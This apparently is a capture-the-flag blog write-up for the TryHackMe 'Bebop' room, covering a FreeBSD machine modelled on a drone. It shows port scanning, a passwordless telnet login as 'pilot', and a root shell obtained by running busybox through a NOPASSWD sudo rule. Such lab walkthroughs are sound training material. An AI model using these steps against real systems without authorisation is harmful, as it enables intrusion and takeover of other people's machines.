---
layout: post
title: Bebop Writeup
date: 2020-10-15 00:00:01 +5:30
categories: [tryhackme, Easy]
tags: [Drone, FreeBSD] # add tag
---

## Description

Defcon 23 Drone Talk <https://www.youtube.com/watch?v=5CzURm7OpAA><br />
The Room was based on parrot drone mentioned in defcon Talk

|Machine|Detail
|:---|:--
|OS | FreeBSD
|Rating | Easy
|Creator | TryHackMe

Room Link <https://tryhackme.com/room/bebop>

## Walkthrough

### Enumeration

```bash
argenestel@parrot  ~/Desktop/tryhackme/bebop  rustscan 10.10.161.59
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
Faster Nmap scanning with Rust.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
--------------------------------------
Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan

[~] The config file is expected to be at "/home/argenestel/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'.
Open 10.10.161.59:22
Open 10.10.161.59:23
[~] Starting Nmap

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.5 (FreeBSD 20170903; protocol 2.0)
| ssh-hostkey:
|   2048 5b:e6:85:66:d8:dd:04:f0:71:7a:81:3c:58:ad:0b:b9 (RSA)
|   256 d5:4e:18:45:ba:d4:75:2d:55:2f:fe:c9:1c:db:ce:cb (ECDSA)
|_  256 96:fc:cc:3e:69:00:79:85:14:2a:e4:5f:0d:35:08:d4 (ED25519)
23/tcp open  telnet  BSD-derived telnetd
Service Info: OS: FreeBSD; CPE: cpe:/o:freebsd:freebsd

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.13 seconds

```

#### Port23

```bash
argenestel@parrot  ~/Desktop/tryhackme/bebop  telnet 10.10.161.59                     
Trying 10.10.161.59...
Connected to 10.10.161.59.
Escape character is '^]'.
login: ^Cpilot
Last login: Sat Oct  5 23:48:53 from cpc147224-roth10-2-0-cust456.17-1.cable.virginm.net
FreeBSD 11.2-STABLE (GENERIC) #0 r345837: Thu Apr  4 02:07:22 UTC 2019

Welcome to FreeBSD!

Release Notes, Errata: https://www.FreeBSD.org/releases/
Security Advisories:   https://www.FreeBSD.org/security/
FreeBSD Handbook:      https://www.FreeBSD.org/handbook/
FreeBSD FAQ:           https://www.FreeBSD.org/faq/
Questions List: https://lists.FreeBSD.org/mailman/listinfo/freebsd-questions/
FreeBSD Forums:        https://forums.FreeBSD.org/

Documents installed with the system are in the /usr/local/share/doc/freebsd/
directory, or can be installed later with:  pkg install en-freebsd-doc
For other languages, replace "en" with a language code like de or fr.

Show the version of FreeBSD installed:  freebsd-version ; uname -a
Please include that output and any error messages when posting questions.
Introduction to manual pages:  man man
FreeBSD directory layout:      man hier

Edit /etc/motd to change this login announcement.
To obtain a neat PostScript rendering of a manual page, use ``-t'' switch
of the man(1) utility: ``man -t <topic>''.  For example:

        man -t grep > grep.ps   # Save the PostScript version to a file
or
        man -t printf | lp      # Send the PostScript directly to printer
[pilot@freebsd ~]$
```

### PrivEsc

```bash
[pilot@freebsd /]$ sudo -l
User pilot may run the following commands on freebsd:
    (root) NOPASSWD: /usr/local/bin/busybox

[pilot@freebsd /]$ sudo busybox sh
# id
uid=0(root) gid=0(wheel) groups=0(wheel),5(operator)
#
```
